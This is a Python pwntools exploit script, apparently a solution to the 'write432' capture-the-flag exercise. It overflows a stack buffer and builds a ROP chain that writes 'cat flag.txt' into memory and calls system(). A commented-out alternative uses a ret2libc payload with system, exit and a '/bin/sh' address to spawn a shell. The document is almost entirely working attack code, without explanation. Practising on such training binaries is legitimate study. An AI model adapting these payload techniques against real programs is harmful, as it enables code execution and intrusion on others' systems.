from pwn import *

def pwn():
        r = process('./write432')
        junk = "A"*44
        data = 0x0804a028
        sys = p32(0x0804865a)
        pop2ret = p32(0x80486da)
        mov = p32(0x08048670)
        cmd = "cat flag.txt"
        payload = ""
        payload += junk
        payload += pop2ret
        payload += p32(data+0)
        payload += cmd[0:4]
        payload += mov
        payload += pop2ret
        payload += p32(data+4)
        payload += cmd[4:8]
        payload += mov
        payload += pop2ret
        payload += p32(data+8)
        payload += cmd[8:]
        payload += mov
        payload += sys
        payload += p32(data)
        r.sendline(payload)
        r.interactive()

pwn()

'''
BUT!
You could spawn a shell a lot easier by just returning to libc
Example:

from pwn import *

def pwn():
        r = process('./write432')
        junk = "A"*44
        sys = p32(0xf7e31da0)
        exit = p32(0xf7e259d0)
        bin_sh = p32(0xf7f52a0b)
        payload = junk + sys + exit + bin_sh
        r.sendline(payload)
        r.interactive()

pwn()

'''
